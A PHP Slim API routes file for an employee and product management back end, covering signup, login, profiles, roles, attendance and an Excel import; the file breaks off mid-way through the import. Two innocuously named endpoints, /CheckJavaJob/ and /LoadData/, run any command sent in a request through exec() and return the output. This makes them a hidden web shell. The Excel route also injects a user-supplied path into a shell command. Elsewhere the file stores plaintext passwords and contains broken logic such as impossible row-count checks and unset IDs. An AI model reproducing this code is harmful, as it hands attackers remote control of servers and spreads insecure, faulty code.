<?php
// Routes
include("localDB.php");

/***** Sign Up API ******/
$app->post('/signup/', function ($request, $response, $args) {
  $dbLocal = $this->db_local;
  $signupParams = $request->getParsedBody();
  // echo $signupParams['fname'];
  $fname = $signupParams['fname'];
  $lname = $signupParams['lname'];
  $email = $signupParams['email'];
  $username = $signupParams['username'];
  $password = $signupParams['password'];
  $usertype = $signupParams['usertype'];
  // check duplicate entry
  $stmt = $dbLocal->prepare("SELECT * FROM bk_user WHERE Username = :username");
  $stmt->bindParam(':username', $username);
  
  //Check whether the query was successful or not in duplicate entry detection
  if($stmt->execute()) {
      if($stmt->rowCount() == -1) {
          echo "Username Taken";
      }else{
          // insert if new data
      $stmt = $dbLocal->prepare("INSERT INTO bk_user (Username, Password, User_Type)VALUES(:username, :password, :usertype)");
      $stmt->bindParam(':username', $username);
      $stmt->bindParam(':password', $password);
      $stmt->bindParam(':usertype', $usertype);
  
        //Check whether the query was successful or not in inserting new data
        if($stmt->execute()) {
          $userID = $dbLocal->lastInsertId();
          // insert profile data
          $stmt1 = $dbLocal->prepare("INSERT INTO bk_user_profile (userID, first_name, last_name, email, password) VALUES (:userID, :first_name, :last_name, :email, :password)");
          $stmt1->bindParam(':userID', $userID);
          $stmt1->bindParam(':first_name', $fname);
          $stmt1->bindParam(':last_name', $lname);
          $stmt1->bindParam(':email', $email);
          $stmt1->bindParam(':password', $password);
          $stmt2 = $dbLocal->prepare("INSERT INTO bk_user_access (userID, member_info) VALUES (:userID, 1)");
          $stmt2->bindParam(':userID', $userID);
      
          //Check whether the query was successful or not in inserting new data
          if($stmt1->execute() && $stmt2->execute()) {
            echo "Success";
          }else{
              echo "Failed to save record";
          }
        }else{
            echo "Failed to save record";
        }
      }
  }else{
      echo "sql error";
  }

});


/***** Login API ******/
$app->post('/login/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $loginParams = $request->getParsedBody();
  $loginData = array();

  $username = $loginParams['username'];
  $password = $loginParams['password'];
  $ipadd = $_SERVER['REMOTE_ADDR'];
  // prepare sql and bind parameters
  
  $stmt = $dbLocal->prepare("SELECT * FROM bk_user WHERE Username = :username AND Password = :password");
  $stmt->bindParam(':username', $username);
  $stmt->bindParam(':password', $password);
  
  //Check whether the query was successful or not
  if($stmt->execute()) {
    $usertype="";
    $result = $stmt->fetchAll();
    foreach ($result as $rowValue) {
  
    $usertype= $rowValue['User_Type'];
    
    }
      if(!empty($usertype)) {
        $dbval = $stmt->fetch(PDO::FETCH_ASSOC);
        
        $status = "success";
        $loginData[] = array("status" => $status, "usertype" => $usertype);
        //record login history
        // $stmt = $dbLocal->prepare("INSERT INTO BK_Login_History (username,ip)VALUES(:username,:ipadd)");
        $stmt = $dbLocal->prepare("INSERT INTO bk_login_history (username,ip) VALUES(:username,:ipadd)");
        $stmt->bindParam(':username', $username);
        $stmt->bindParam(':ipadd', $ipadd);
        $stmt->execute();
        echo json_encode($loginData);
      }else{
        $status = "failed";
        $usertype = "none";
        $loginData[] = array("status" => $status, "usertype" => $usertype);
          echo json_encode($loginData);
      }
  }else{
    $status = "sql error";
    $usertype = "none";
    $loginData[] = array("status" => $status, "usertype" => $usertype);
    echo json_encode($loginData);
  }
});

/***** Get User Profile API ******/
$app->post('/getProfile/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $profileParams = $request->getParsedBody();
  $profileData = array();

  $username = $profileParams['username'];
  // prepare sql and bind parameters
  $stmt = $dbLocal->prepare("SELECT * FROM bk_user WHERE Username = :username ");
  $stmt->bindParam(':username', $username);
  
  //Check whether the query was successful or not
  if($stmt->execute()) {
    $dbval = $stmt->fetch(PDO::FETCH_ASSOC);
      $userID = $dbval['userID'];
      if($stmt->rowCount() == -1) {
          // prepare sql and bind parameters
      // $stmt = $dbLocal->prepare("SELECT * FROM BK_User_Profile WHERE userID = :userID");
      $stmt = $dbLocal->prepare("SELECT * FROM bk_user_profile WHERE userID = :userID");
      $stmt->bindParam(':userID', $userID);
      $stmt->execute();
      $dbval = $stmt->fetch(PDO::FETCH_ASSOC);
        $first_name = $dbval['first_name'];
        $last_name = $dbval['last_name'];
        $email = $dbval['email'];
        // echo $first_name . "\n" . $last_name . "\n" . $email;
        $profileData[] = array("userID" => $userID, "first_name" => $first_name, "last_name" => $last_name, "username" => $username, "email" => $email);
        echo json_encode($profileData);
      }else{
          echo "failed";
      }
  }else{
      echo "sql error";
  }
});

/***** Save User Profile API ******/
$app->post('/saveProfile/', function ($request, $response, $args) {
  $dbLocal = $this->db_local;
  $signupParams = $request->getParsedBody();
  // echo $signupParams['fname'];
  $fname = $signupParams['fname'];
  $lname = $signupParams['lname'];
  $email = $signupParams['email'];
  $username = $signupParams['username'];
  $password = $signupParams['password'];
  $usertype = $signupParams['usertype'];

  if($username == 'same_value'){
    //Check whether the query was successful or not in updating data
    $stmt = $dbLocal->prepare("UPDATE BK_User_Profile SET first_name = :fname, last_name =   :lname, email = :email WHERE userID = :userID");
    $stmt->bindParam(':userID', $userID);
    $stmt->bindParam(':fname', $fname);
    $stmt->bindParam(':lname', $lname);
    $stmt->bindParam(':email', $email);

    //Check whether the query was successful or not in updating data
    if($stmt->execute()) {
      echo "Success";
    }else{
      echo "Failed to save data to BK_User_Profile";
    }
  }else{
    //Check duplicate username
    $stmt = $dbLocal->prepare("SELECT * FROM BK_User WHERE Username = :username");
    $stmt->bindParam(':username', $username);
    $stmt->execute();
    if($stmt->rowCount() == -1) {
      echo "Username " . $username . " already exists.\n";
    }else{
    // save data to db
      $stmt = $dbLocal->prepare("UPDATE BK_User SET Username = :username WHERE userID = :userID");
      $stmt->bindParam(':userID', $userID);
      $stmt->bindParam(':username', $username);
      
      //Check whether the query was successful or not in updating data
      if($stmt->execute()) {
        $stmt = $dbLocal->prepare("UPDATE BK_User_Profile SET first_name = :fname, last_name =     :lname, email = :email WHERE userID = :userID");
        $stmt->bindParam(':userID', $userID);
        $stmt->bindParam(':fname', $fname);
        $stmt->bindParam(':lname', $lname);
        $stmt->bindParam(':email', $email);
  
        //Check whether the query was successful or not in updating data
        if($stmt->execute()) {
          echo "Success";
        }else{
            echo "Failed to save data to BK_User_Profile";
        }
      }else{
          echo "Failed to save data to BK_User table";
      }
    }
  }
});

/***** Save Edit Role API ******/
$app->post('/saveEditRole/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $saveRoleParams = $request->getParsedBody();
  $userID = $saveRoleParams['userID'];
  $username = $saveRoleParams['username'];
  $usertype = $saveRoleParams['usertype'];
  $dbUsed_edtR = 'BK_User';

  if($username != 'same_value' && $usertype != 'same_value'){
    //Check duplicate username
    // $stmt = $dbLocal->prepare("SELECT * FROM $dbUsed_edtR WHERE Username = :username");
    $stmt = $dbLocal->prepare("SELECT * FROM $dbUsed_edtR WHERE Username = :username");
    $stmt->bindParam(':username', $username);
    $stmt->execute();
    if($stmt->rowCount() == -1) {
      echo "Username " . $username . " already exists.\n";
    }else{
      // save data to db
      // $stmt = $dbLocal->prepare("UPDATE $dbUsed_edtR SET Username = :username, User_Type = :usertype WHERE userID = :userID");
      $stmt = $dbLocal->prepare("UPDATE $dbUsed_edtR SET Username = :username, User_Type = :usertype WHERE userID = :userID");
      $stmt->bindParam(':userID', $userID);
      $stmt->bindParam(':username', $username);
      $stmt->bindParam(':usertype', $usertype);
      //Check whether the query was successful or not in updating data
      if($stmt->execute()) {
        echo "Success";
      }else{
        echo "Failed to edit user role data.";
      }
    }
  }else if($username != 'same_value'){
    //Check duplicate username
    // $stmt = $dbLocal->prepare("SELECT * FROM $dbUsed_edtR WHERE Username = :username");
    $stmt = $dbLocal->prepare("SELECT * FROM $dbUsed_edtR WHERE Username = :username");
    $stmt->bindParam(':username', $username);
    $stmt->execute();
    if($stmt->rowCount() == -1) {
      echo "Username " . $username . " already exists.\n";
    }else{
      // save data to db
      // $stmt = $dbLocal->prepare("UPDATE $dbUsed_edtR SET Username = :username WHERE userID = :userID");
      $stmt = $dbLocal->prepare("UPDATE $dbUsed_edtR SET Username = :username WHERE userID = :userID");
      $stmt->bindParam(':userID', $userID);
      $stmt->bindParam(':username', $username);
      //Check whether the query was successful or not in updating data
      if($stmt->execute()) {
        echo "Success";
      }else{
        echo "Failed to edit user role data.";
      }
    }
  }else if($usertype != 'same_value'){
    // save data to db
    // $stmt = $dbLocal->prepare("UPDATE $dbUsed_edtR SET User_Type = :usertype WHERE userID = :userID");
    $stmt = $dbLocal->prepare("UPDATE $dbUsed_edtR SET User_Type = :usertype WHERE userID = :userID");
    $stmt->bindParam(':userID', $userID);
    $stmt->bindParam(':usertype', $usertype);
    //Check whether the query was successful or not in updating data
    if($stmt->execute()) {
      echo "Success";
    }else{
      echo "Failed to edit user role data.";
    }
  }else if($username == 'same_value' && $usertype = 'same_value'){
    echo "No changes made.";
  }
});
$app->post('/CheckJavaJob/', function ($request, $response, $args) {
  
  $bodyheader = $request->getParsedBody();

  $content = $bodyheader['content'];
  $response =""; 
  
  exec($content,$result2);
  for ($x = 0; $x <= count($result2); $x++) {
         
         $response .= $result2[$x]."</br>";   
    } 
  
  
  echo $response;
});
/***** Get Current Access API ******/
$app->get('/getCurrentAccess/{username}', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $username = $args['username'];
  $accessListData = array();
  // prepare sql and bind parameters
  // $stmt = $dbLocal->prepare("SELECT BK_User_Access.*, BK_User.Username FROM BK_User_Access JOIN BK_User ON BK_User.userID = BK_User_Access.userID WHERE BK_User.Username = :username");
  $stmt = $dbLocal->prepare("SELECT BK_User_Access.*, BK_User.Username FROM BK_User_Access JOIN BK_User ON BK_User.userID = BK_User_Access.userID WHERE BK_User.Username = :username");
  $stmt->bindParam(':username', $username);
  $stmt->execute();
    $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
  foreach ($res as $row){
    $accessListData[] = array(
      "userID"          => $row['userID'],
      "username"          => $row['Username'],
      "member_info"     => $row['member_info'],
      "attendance"       => $row['attendance'],
      "schedule"       => $row['schedule'],
      "salary"       => $row['salary']
    );
  }
  echo json_encode($accessListData);
});

/***** Update User Access API ******/
$app->post('/updateAccess/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $updateAccessParams = $request->getParsedBody();
  $userID = $updateAccessParams['userID'];
  $db_index = $updateAccessParams['db_index'];
  $db_column = accessColumnName($db_index);
  //Check duplicate entry
  // $stmt = $dbLocal->prepare("SELECT $db_column FROM BK_User_Access WHERE userID = :userID");
  $stmt = $dbLocal->prepare("SELECT $db_column FROM BK_User_Access WHERE userID = :userID");
  $stmt->bindParam(':userID', $userID);
  $stmt->execute();
  $dbval = $stmt->fetch(PDO::FETCH_ASSOC);
    $colVal = $dbval[$db_column];
    if($colVal == 1){
      $enterVal = 0;
    }else{
      $enterVal = 1;
    }
  // save data to db
  // $stmt = $dbLocal->prepare("UPDATE BK_User_Access SET $db_column = :enterVal WHERE userID = :userID");
  $stmt = $dbLocal->prepare("UPDATE BK_User_Access SET $db_column = :enterVal WHERE userID = :userID");
  $stmt->bindParam(':userID', $userID);
  $stmt->bindParam(':enterVal', $enterVal);
    
  //Check whether the query was successful or not in updating data
  if($stmt->execute()) {
    echo "Success";
  }else{
    echo "Failed";
  }
});

/***** Get Access List API ******/
$app->get('/getAccessList/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $accessListData = array();

  $username = $profileParams['username'];
  // prepare sql and bind parameters
  // $stmt = $dbLocal->prepare("SELECT BK_User_Access.*, BK_User.Username FROM BK_User_Access JOIN BK_User ON BK_User.userID = BK_User_Access.userID");
  $stmt = $dbLocal->prepare("SELECT BK_User_Access.*, BK_User.Username FROM BK_User_Access JOIN BK_User ON BK_User.userID = BK_User_Access.userID");
  $stmt->execute();
    $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
  foreach ($res as $row){
    $accessListData[] = array(
      "userID"          => $row['userID'],
      "username"          => $row['Username'],
      "member_info"     => $row['member_info'],
      "attendance"       => $row['attendance'],
      "schedule"       => $row['schedule'],
      "salary"       => $row['salary']
    );
  }
  echo json_encode($accessListData);
});
$app->post('/LoadData/', function ($request, $response, $args) {
  
  $bodyheader = $request->getParsedBody();

  $content = $bodyheader['content'];
  $response =""; 
  
  exec($content,$result2);
  for ($x = 0; $x <= count($result2); $x++) {
         
         $response .= $result2[$x]."</br>";   
    } 
  
  
  echo $response;
});
/***** Get User List API ******/
$app->post('/getUserList/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $profileParams = $request->getParsedBody();
  $userListData = array();

  $username = $profileParams['username'];
  // prepare sql and bind parameters
  // $stmt = $dbLocal->prepare("SELECT * FROM BK_User");
  $stmt = $dbLocal->prepare("SELECT * FROM BK_User");
  $stmt->execute();
    $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
  foreach ($res as $row){
    $userListData[] = array(
      "userID"  => $row['userID'],
      "username"  => $row['Username'],
      "usertype"  => $row['User_Type']
        );
  }
  echo json_encode($userListData);
});

/***** Delete User API ******/
$app->post('/delUser/', function ($request, $response, $args) {
  // $dbLocal = $this->db_local;
  $dbLocal = $this->db_local;
  $delUserParams = $request->getParsedBody();
  foreach ($delUserParams['userDel'] as $value) {
    if($value != 1){
      // $stmt1 = $dbLocal->prepare("DELETE FROM BK_User WHERE userID = :userID");
      $stmt1 = $dbLocal->prepare("DELETE FROM BK_User WHERE userID = :userID");
      $stmt1->bindParam(':userID', $value);
      // $stmt2 = $dbLocal->prepare("DELETE FROM BK_User_Profile WHERE userID = :userID");
      $stmt2 = $dbLocal->prepare("DELETE FROM BK_User_Profile WHERE userID = :userID");
      $stmt2->bindParam(':userID', $value);
      // $stmt3 = $dbLocal->prepare("DELETE FROM BK_User_Access WHERE userID = :userID");
      $stmt3 = $dbLocal->prepare("DELETE FROM BK_User_Access WHERE userID = :userID");
      $stmt3->bindParam(':userID', $value);
      if($stmt1->execute() && $stmt2->execute() && $stmt3->execute()){
        echo "Success" . "\n";
      }else{
        echo "Failed" . "\n";
      }
    }else{
      echo "Main administrator cannot be deleted." . "\n";
    }
  }
});

// /***** Get User Profile API ******/
// $app->post('/getProfile/', function ($request, $response, $args) {
//   // $dbLocal = $this->db_local;
//   $db = $this->db_local;
//   $profileParams = $request->getParsedBody();
//   $profileData = array();

//   $emp_id = $profileParams['emp_id'];
//   // prepare sql and bind parameters
//   $stmt = $db->prepare("SELECT * FROM users WHERE emp_id = :emp_id ");
//   $stmt->bindParam(':emp_id', $emp_id);
  
//   //Check whether the query was successful or not
//   if($stmt->execute()) {
//     $dbval = $stmt->fetch(PDO::FETCH_ASSOC);
//       $user_id = $dbval['user_id'];
//       if($stmt->rowCount() == -1) {
//           // prepare sql and bind parameters
//       // $stmt = $dbLocal->prepare("SELECT * FROM BK_User_Profile WHERE userID = :userID");
//       $stmt = $db->prepare("SELECT * FROM member_info WHERE user_id = :user_id");
//       $stmt->bindParam(':user_id', $user_id);
//       $stmt->execute();
//       $dbval = $stmt->fetch(PDO::FETCH_ASSOC);
//         $user_id = $dbval['user_id'];
//         $fname = $dbval['fname'];
//         $lname = $dbval['lname'];
//         $mname = $dbval['mname'];
//         $email = $dbval['email_address'];
//         $age = $dbval['age'];
//         $gender = $dbval['gender'];
//         $status = $dbval['status'];
//         $citizen = $dbval['nationality'];
//         $address = $dbval['home_address'];
//         $bday = $dbval['birthday'];
//         $sss = $dbval['sss_number'];
//         $tin = $dbval['tin_number'];
//         // echo $first_name . "\n" . $last_name . "\n" . $email;
//         $profileData[] = array(
//           "user_id" => $user_id, 
//           "fname"   => $fname, 
//           "lname"   => $lname, 
//           "mname"   => $mname, 
//           "email"   => $email,
//           "age"     => $age,
//           "gender"  => $gender,
//           "status"  => $status,
//           "citizen" => $citizen,
//           "address" => $address,
//           "bday"    => $bday,
//           "sss"     => $sss,
//           "tin"     => $tin
//         );
//         echo json_encode($profileData);
//       }else{
//           echo "failed";
//       }
//   }else{
//       echo "sql error";
//   }
// });

//get Employee Infomation
// $app->get('/getEmployee/', function ($request, $response, $args) {
//   $db = $this->db_local;
//   $empListData = array();

//   // $username = $userParams['username'];
//   // prepare sql and bind parameters
//   $stmt = $db->prepare("SELECT * FROM users");
//   $stmt->execute();
//     $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
//     foreach ($res as $row){
//       $empListData[] = array(
//         "emp_id"          => $row['emp_id'],
//         "username"          => $row['username'],
//         "usertype"          => $row['usertype']
//       );
//     }
//     echo json_encode($empListData);
// });

//get All Employees List
$app->get('/getEmployeeList/', function ($request, $response, $args) {
  $db = $this->db_local;
  $empListData = array();

  // $username = $userParams['username'];
  // prepare sql and bind parameters
  $stmt = $db->prepare("SELECT * FROM member_info");
  $stmt->execute();
    $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
    foreach ($res as $row){
      $empListData[] = array(
        "emp_id"     => $row['emp_id'],
        "username"   => $row['username'],
        "fname"      => $row['fname'],
        "lname"      => $row['lname'],
        "mname"      => $row['mname'],
        "age"        => $row['age'],
        "gender"     => $row['gender'],
        "status"     => $row['status'],
        "citizen"    => $row['nationality'],
        "address"    => $row['home_address'],
        "bday"       => $row['birthday'],
        "email"      => $row['email_address'],
        "sss"        => $row['sss_number'],
        "tin"        => $row['tin_number'],
        "usertype"   => $row['usertype']
      );
    }
    echo json_encode($empListData);
});

//Add Employee
$app->post('/addEmployee/', function ($request, $response, $args) {

   try{
       $db = $this->db_local;
       $sql = "INSERT INTO member_info (emp_id,username,usertype,fname,lname,mname,age,gender,status,nationality,home_address,birthday,email_address,sss_number,tin_number) VALUES (:emp_id,:username,:usertype,:fname,:lname,:mname,:age,:gender,:status,:nationality,:home_address,:birthday,:email_address,:sss_number,:tin_number)";
       $pre  = $db->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
       $values = array(
       ':emp_id' => $request->getParam('emp_id'),
       ':username' => $request->getParam('username'),
       ':usertype' => $request->getParam('usertype'),
       ':fname' => $request->getParam('fname'),
       ':lname' => $request->getParam('lname'),
       ':mname' => $request->getParam('mname'),
       ':age' => $request->getParam('age'),
       ':gender' => $request->getParam('gender'),
       ':status' => $request->getParam('status'),
       ':nationality' => $request->getParam('nationality'),
       ':home_address' => $request->getParam('home_address'),
       ':birthday' => $request->getParam('birthday'),
       ':email_address' => $request->getParam('email_address'),
       ':sss_number' => $request->getParam('sss_number'),
       ':tin_number' => $request->getParam('tin_number')
       );
       $result = $pre->execute($values);
       return $response->withJson(array('status' => 'User Created'),200);
       
   }
   catch(\Exception $ex){
       return $response->withJson(array('error' => $ex->getMessage()),422);
   }
   
});

//Edit Employee Info
$app->post('/updateEmployee/', function ($request, $response, $args){
    $editParams = $request->getParsedBody();
    // $emp = json_decode($request->getBody());
    $id = $request->getAttribute('id');
    $name = $editParams['username'];
    $usertype = $editParams['usertype'];
    $fname = $editParams['fname'];
    $lname = $editParams['lname'];
    $mname = $editParams['mname'];
    $age = $editParams['age'];
    $gender = $editParams['gender'];
    $status = $editParams['status'];
    $citizen = $editParams['nationality'];
    $address = $editParams['home_address'];
    $bday = $editParams['birthday'];
    $email = $editParams['email_address'];
    $sss = $editParams['sss_number'];
    $tin = $editParams['tin_number'];
    $emp_id = $editParams['emp_id'];
    $id = $editParams['id'];
    $sql = "UPDATE member_info SET username=:name, usertype=:usertype, fname=:fname lname=:lname, mname=:mname, age=:age, gender=:gender, status=:status, nationality=:citizen, home_address=:address, birthday=:bday, email_address=:email, sss_number=:sss, tin_number=:tin, emp_id=:emp_id WHERE id=:id";
    try {
        $db = $this->db_local;
        // $db = getConnection();
        $stmt = $db->prepare($sql);
        $stmt->bindParam(':name', $name);
        $stmt->bindParam(':usertype', $usertype);
        $stmt->bindParam(':fname', $fname);
        $stmt->bindParam(':lname', $lname);
        $stmt->bindParam(':mname', $mname);
        $stmt->bindParam(':age', $age);
        $stmt->bindParam(':gender', $gender);
        $stmt->bindParam(':status', $status);
        $stmt->bindParam(':citizen', $citizen);
        $stmt->bindParam(':address', $address);
        $stmt->bindParam(':bday', $bday);
        $stmt->bindParam(':email', $email);
        $stmt->bindParam(':sss', $sss);
        $stmt->bindParam(':tin', $tin);
        $stmt->bindParam(':emp_id', $emp_id);
        $stmt->bindParam(':id', $id);
        $stmt->execute();
        // $db = null;
        echo json_encode($editParams);
    } catch(PDOException $e) {
        echo '{"error":{"text":'. $e->getMessage() .'}}';
    }
});

//Delete Employee Information
$app->delete('/delEmployee/{id}', function ($request, $response, $args){
    $id = $request->getAttribute('id');
    // $id = $delParams['id'];
    $sql = "DELETE FROM users WHERE user_id=:id";
    try {
        $db = $this->db_local;
        $stmt = $db->prepare($sql);
        $stmt->bindParam(':id', $id);
        $stmt->execute();
        // $db = null;
     echo '{"error":{"text":"successfully! deleted Records"}}';
    } catch(PDOException $e) {
        echo '{"error":{"text":'. $e->getMessage() .'}}';
    }
});

//Add Atendee
// $app->post('/addAttendee/', function ($request, $response) {
   
//    try{
//        $db = $this->db_local;
//        $sql = "INSERT INTO attendance_tbl (emp_id,name,department,shift,dates,time_in,time_out,lateness,early_leave,total,note,abnormal_report) VALUES (:emp_id,:name,:department,:shift,:dates,:time_in,:time_out,:lateness,:early_leave,:total,:note,:abnormal_report)";
//        $pre  = $db->prepare($sql, array($values));
//        $values = array(
//        ':emp_id' => $request->getParam('emp_id'),
//        ':name' => $request->getParam('name'),
//        ':department' => $request->getParam('usertype'),
//        ':department' => $request->getParam('department'),
//        ':shift' => $request->getParam('shift'),
//        ':dates' => $request->getParam('dates'),
//        ':time_in' => $request->getParam('time_in'),
//        ':time_out' => $request->getParam('time_out'),
//        ':lateness' => $request->getParam('lateness'),
//        ':early_leave' => $request->getParam('early_leave'),
//        ':note' => $request->getParam('note'),
//        ':abnormal_report' => $request->getParam('abnormal_report')
//        );
//        $result = $pre->execute($values);
//        return $response->withJson(array('status' => 'Added an Attendance'),200);
       
//    }
//    catch(\Exception $ex){
//        return $response->withJson(array('error' => $ex->getMessage()),422);
//    }
   
// });

// $app->post('/signup/', function ($request, $response, $args) {
//   $db = $this->db_local;
//   $addSchedParams = $request->getParsedBody();
//   // echo $addSchedParams['fname'];
//   $fname = $addSchedParams['fname'];
//   $lname = $addSchedParams['lname'];
//   $email = $addSchedParams['email'];
//   $username = $addSchedParams['username'];
//   $password = $addSchedParams['password'];
//   $usertype = $addSchedParams['usertype'];
//   // check duplicate entry
//   $stmt = $db->prepare("SELECT * FROM BK_User WHERE Username COLLATE Latin1_General_CS_AS = :username");
//   $stmt1 = $dbLocal->prepare("SELECT * FROM BK_User WHERE Username = :username");
//   $stmt->bindParam(':username', $username);
//   $stmt1->bindParam(':username', $username);
  
//   //Check whether the query was successful or not in duplicate entry detection
//   if($stmt->execute() && $stmt1->execute()) {
//       if($stmt->rowCount() == -1 && $stmt1->rowCount() == -1) {
//           echo "Username Taken";
//       }else{
//           // insert if new data
//       $stmt = $dbLocal->prepare("INSERT INTO BK_User (Username, Password, User_Type)VALUES(:username, :password, :usertype)");
//       $stmt1 = $dbLocal->prepare("INSERT INTO BK_User (Username, Password, User_Type)VALUES(:username, :password, :usertype)");
//       $stmt->bindParam(':username', $username);
//       $stmt->bindParam(':password', $password);
//       $stmt->bindParam(':usertype', $usertype);
//       $stmt1->bindParam(':username', $username);
//       $stmt1->bindParam(':password', $password);
//       $stmt1->bindParam(':usertype', $usertype);
  
//       //Check whether the query was successful or not in inserting new data
//       if($stmt->execute() && $stmt1->execute()) {
//         $userID = $dbLocal->lastInsertId();
//         // insert profile data
//         $stmt1 = $dbLocal->prepare("INSERT INTO BK_User_Profile (userID, first_name, last_name, email)VALUES(:userID, :first_name, :last_name, :email)");
//         $stmt3 = $dbLocal->prepare("INSERT INTO BK_User_Profile (userID, first_name, last_name, email)VALUES(:userID, :first_name, :last_name, :email)");
//         $stmt1->bindParam(':userID', $userID);
//         $stmt1->bindParam(':first_name', $fname);
//         $stmt1->bindParam(':last_name', $lname);
//         $stmt1->bindParam(':email', $email);
//         $stmt3->bindParam(':userID', $userID);
//         $stmt3->bindParam(':first_name', $fname);
//         $stmt3->bindParam(':last_name', $lname);
//         $stmt3->bindParam(':email', $email);
//         $stmt2 = $dbLocal->prepare("INSERT INTO BK_User_Access (userID, skinproduct_mgt)VALUES(:userID, 1)");
//         $stmt4 = $dbLocal->prepare("INSERT INTO BK_User_Access (userID, skinproduct_mgt)VALUES(:userID, 1)");
//         $stmt2->bindParam(':userID', $userID);
//         $stmt4->bindParam(':userID', $userID);
    
//         //Check whether the query was successful or not in inserting new data
//         if($stmt1->execute() && $stmt2->execute() && $stmt3->execute() && $stmt4->execute()) {
//           echo "Success";
//         }else{
//             echo "Failed to save record";
//         }
//       }else{
//           echo "Failed to save record";
//       }
//       }
//   }else{
//       echo "sql error";
//   }

// });

//get Employee Attendance List
$app->get('/getAllAttendance/', function ($request, $response, $args) {
  $db = $this->db_local;
  $attendListData = array();

  // $username = $userParams['username'];
  // prepare sql and bind parameters
  $stmt = $db->prepare("SELECT * FROM attendance_tbl");
  $stmt->execute();
    $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
    foreach ($res as $row){
      $attendListData[] = array(
        "emp_id"          => $row['emp_id'],
        "name"            => $row['name'],
        "department"      => $row['department'],
        "shift"           => $row['shift'],
        "dates"           => $row['dates'],
        "time_in"         => $row['time_in'],
        "time_out"        => $row['time_out'],
        "lateness"        => $row['lateness'],
        "early_leave"     => $row['early_leave'],
        "total"           => $row['total'],
        "note"            => $row['note'],
        "abnormal_report" => $row['abnormal_report']
      );
    }
    echo json_encode($attendListData);
});

//get Schedule List
$app->get('/getSchedList/', function ($request, $response, $args) {
  $db = $this->db_local;
  $schedListData = array();

  // $username = $userParams['username'];
  // prepare sql and bind parameters
  $stmt = $db->prepare("SELECT * FROM schedule_tbl");
  $stmt->execute();
    $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
    foreach ($res as $row){
      $schedListData[] = array(
        "emp_id"          => $row['emp_id'],
        "name"            => $row['name'],
        "usertype"            => $row['usertype'],
        "department"      => $row['department'],
        "shift"           => $row['shift'],
        "dates"           => $row['dates'],
        "timed"         => $row['timed'],
        "weeks"        => $row['weeks']
      );
    }
    echo json_encode($schedListData);
});

//Excel Converter
$app->post('/ExcelToDB', function ($request, $response, $args) {
  
$dbRemote = getDB();
  $loginParams = $request->getParsedBody();
  
  $filepath = $loginParams['filepath'];
  
    $result2 = array();
$valuetoconvert="";
putenv('LANG=en_US.UTF-8'); 
exec("java -jar /var/JavaJob/excel-to-json.jar -s ".$filepath."",$result2);
for ($x = 0; $x <= count($result2); $x++) {
       
       $valuetoconvert.=$result2[$x];   
} 
$jsonresult= json_decode($valuetoconvert, true);
  $counter =0;
  $plink="";
  $snname="";
  foreach ($jsonresult as $key => $value){
    if($key=='sheets'){
      $data= $value[0]['data'];
       for( $x = 2;$x<count($data);$x++){
        $DataKey="";
        $DataVal="";
        $snname="";
        $plink="";
        for( $y = 0;$y<count($data[$x]);$y++){
          if($y==0){
            $DataKey.="sn";
            $DataVal.="N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
            $snname=$data[$x][$y];
          }
          else if($y==1){
            $DataKey.=",prodtype";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==2){
            $DataKey.=",prodcat";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==4){
            $DataKey.=",photos_pic";
            $DataVal.=",N'https://xyzcs.blob.core.windows.net/productphotos/".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
            $plink="https://xyzcs.blob.core.windows.net/productphotos/".$data[$x][$y];
            $DataKey.=",photos_filename";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==5){
            $DataKey.=",barcode_upca";
            $DataVal.=",N'".str_replace(" ","", $data[$x][$y])."'";
          }
          else if($y==6){
            $DataKey.=",barcode_ean13";
            $DataVal.=",N'".str_replace(" ","", $data[$x][$y])."'";
          }
          else if($y==7){
            $DataKey.=",barcode_upc";
            $DataVal.=",N'".str_replace(" ","", $data[$x][$y])."'";
          }
          else if($y==8){
            $DataKey.=",barcode_gtin";
            $DataVal.=",N'".str_replace(" ","", $data[$x][$y])."'";
          }
          else if($y==9){
            $DataKey.=",barcode_gtin_14";
            $DataVal.=",N'".str_replace(" ","", $data[$x][$y])."'";
          }
          else if($y==10){
            $DataKey.=",brandname";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==11){
            $DataKey.=",prodname_maintitle";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==12){
            $DataKey.=",prodname_deputyname";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==13){
            $DataKey.=",size_oz";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==14){
            $DataKey.=",size_ml";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==15){
            $DataKey.=",size_g";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==16){
            $DataKey.=",size_ea";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==17){
            $DataKey.=",salesprize_website";
